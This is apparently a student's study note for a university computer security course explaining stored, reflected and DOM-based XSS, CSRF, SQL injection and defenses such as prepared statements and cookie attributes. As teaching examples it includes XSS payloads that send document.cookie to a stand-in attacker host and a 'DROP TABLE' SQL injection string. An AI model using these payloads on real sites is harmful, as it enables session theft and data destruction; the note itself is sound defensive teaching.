---
tags:
  - university
  - bcs2420
  - computer-security
---

# XSS, CSRF, SQL Injection, and Session Defenses

> [!abstract] Why this note matters
> - Tutorial L6 and Lab 4 directly cover these web vulnerabilities and browser-mediated defenses.
> - These are classic exam topics because each attack has a different mechanism and defense pattern.

## Overview

Web application attacks work because browsers, servers, cookies, and input handling interact in predictable ways. The course expects you to distinguish those mechanisms rather than treating all web bugs as one category.

XSS abuses how untrusted data reaches executable browser contexts. CSRF abuses how browsers automatically attach authentication state. SQL injection abuses how applications merge untrusted input into server-side queries.

## Exam Focus

- Tier 1 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

## Core Definitions

- **stored XSS**: A script injection that is saved by the application and later served to other users.
- **reflected XSS**: A script injection immediately reflected in a response to the victim's request.
- **DOM-based XSS**: A script injection caused entirely by client-side JavaScript and DOM manipulation.
- **CSRF**: Cross-Site Request Forgery; causing a user's browser to send authenticated requests they did not intend.
- **prepared statement**: A query mechanism that separates SQL structure from user data.

## Detailed Explanation

Stored XSS persists in the application's data and affects later visitors. Reflected XSS sends the malicious payload back immediately in the current response, often through error messages or search pages. DOM-based XSS happens entirely in the browser when unsafe client-side code inserts untrusted data into the DOM.

CSRF is different. The attacker does not need to read the victim's page. They only need the victim's browser to send a request to a site where the victim is already authenticated. Because the browser attaches cookies automatically, the server may treat the request as legitimate unless anti-CSRF defenses are present.

HttpOnly cookies help against some XSS-based cookie theft because scripts cannot read them directly. Secure cookies require HTTPS transport. SameSite can reduce some cross-site request abuse. But none of these solve every session problem, especially if the site has broader logic flaws.

SQL injection is best prevented by parameterized queries, not by ad hoc escaping rituals. Tutorial L6 explicitly emphasizes prepared statements because they keep code and data structurally separate.

## How It Works

XSS defense -> sanitize or encode untrusted output and constrain script execution.

CSRF defense -> use anti-CSRF tokens, SameSite policies, and re-authentication for sensitive actions.

SQL injection defense -> use prepared statements and safe server-side handling of untrusted input.

## What You Must Know

- Differences between stored, reflected, and DOM-based XSS.
- Why CSRF works and why CSRF tokens help.
- Why prepared statements are the preferred SQL injection defense.
- What HttpOnly and Secure cookie attributes do.

## 30-Second Oral Answer

- XSS is code injection into browser execution contexts; CSRF is browser-forced authenticated action; SQL injection is server-side query manipulation.
- Each class has a different defense pattern, so the attack mechanism must be named precisely.

## Typical Exam Questions

- What is the difference between reflected and stored XSS?
- Why do HttpOnly cookies help against some XSS attacks?
- How does CSRF work?
- Why are prepared statements better than manual string concatenation?

## Common Pitfalls

- Calling CSRF a script-injection attack.
- Treating HTTPS as a complete defense against CSRF or XSS.
- Assuming client-side validation prevents SQL injection.

## Concrete Examples and Commands

### Stored vs Reflected XSS — Comparison

| Aspect | Stored XSS | Reflected XSS |
|--------|------------|---------------|
| Where the payload lives | Saved in the application's database (or other persistent store) | Embedded in a single request URL or form parameter |
| When it executes | Every time a victim views the affected page | When the victim clicks/submits the crafted request |
| Who the victim is | Any user who visits the page later | Only the user who is tricked into making that specific request |
| Delivery vector | The attacker just posts the payload once (e.g., into a comment) | Phishing link, malicious form, or other social-engineering bait |
| Example payload context | A blog comment field saved to DB | A search query reflected back in an error page |

**Stored XSS payload example (e.g., posted as a forum comment).**

```html
<!-- attacker submits as the comment body -->
<script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>

<!-- the application saves it to the DB and renders it for every visitor: -->
<div class="comment">
  <script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>
</div>
```

**Reflected XSS payload example (in a crafted URL).**

```text
https://victim.example/search?q=<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>

The server includes ?q=... in the response page without encoding:

<p>You searched for: <script>fetch('https://attacker.example/steal?c='+document.cookie)</script></p>

The victim clicks the link in a phishing email; the script runs once in their browser.
```

The defining contrast: stored XSS is fire-and-forget for the attacker and persists across visitors; reflected XSS needs each victim to be lured into a specific request.

### SQL Injection — Prepared Statements vs Escaping

**Vulnerable (string concatenation).**

```text
SQL = "SELECT * FROM users WHERE name = '" + input + "'"

input: '; DROP TABLE users; --

resulting SQL: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
```

**Prepared statement (parameterised query, bound input).**

```text
# Python / DB-API style
cursor.execute(
  "SELECT * FROM users WHERE name = ?",
  (input,)
)

# Java / JDBC style
PreparedStatement ps = conn.prepareStatement(
  "SELECT * FROM users WHERE name = ?"
);
ps.setString(1, input);
ResultSet rs = ps.executeQuery();
```

The placeholder `?` (or `:name` / `$1` depending on the driver) marks where data goes. The database driver sends the SQL structure and the parameter values **separately** — the input is never interpreted as SQL syntax, so injection is structurally impossible.

**Why manual escaping is fragile.** Escaping tries to quote dangerous characters so they cannot break out of a string literal. The problem is encoding ambiguity:

- Multi-byte character sets (e.g., GBK, BIG5) can produce sequences where a leading byte combines with a following backslash to form a single character — the escape character is consumed and the closing quote becomes unmatched. Historic MySQL/PHP injection bugs exploited exactly this.
- Different databases interpret quoting and escaping differently (single quotes, double quotes, backticks, `\` vs doubled-quote escaping).
- Numeric and identifier contexts often have no string quoting at all, so an "escape every quote" routine misses them entirely.

Prepared statements sidestep all of this by keeping SQL syntax and data values on separate channels at the driver level. The exam-grade rule: **separate code from data — never trust escaping alone.**

## Related Concepts

- [[Web Architecture, HTTP, Cookies, and the Browser Security Model|Web Architecture, HTTP, Cookies, and the Browser Security Model]]
- [[Lab 1 and Lab 2 Cryptography, Authentication, and Web Weaknesses|Lab 1 and Lab 2: Cryptography, Authentication, and Web Weaknesses]]
- [[Lab 3 and Lab 4 Rootkit Recon, Browser Tools, and Web Exploitation|Lab 3 and Lab 4: Rootkit Recon, Browser Tools, and Web Exploitation]]

## Sources

- [[01 Syllabus and Course Policies|Syllabus and Course Policies]]
- [[02 Source Inventory|Source Inventory]]
- [[03 Security Course Corpus|Security Course Corpus]]
- [Tutorial L6.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial L6.pdf)
- [Tutorial L6 Solution..pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial L6 Solution..pdf)
- [lab2.pdf](/Users/davidwickerhf/Downloads/Computer Security/lab2.pdf)
- [lab4.pdf](/Users/davidwickerhf/Downloads/Computer Security/lab4.pdf)
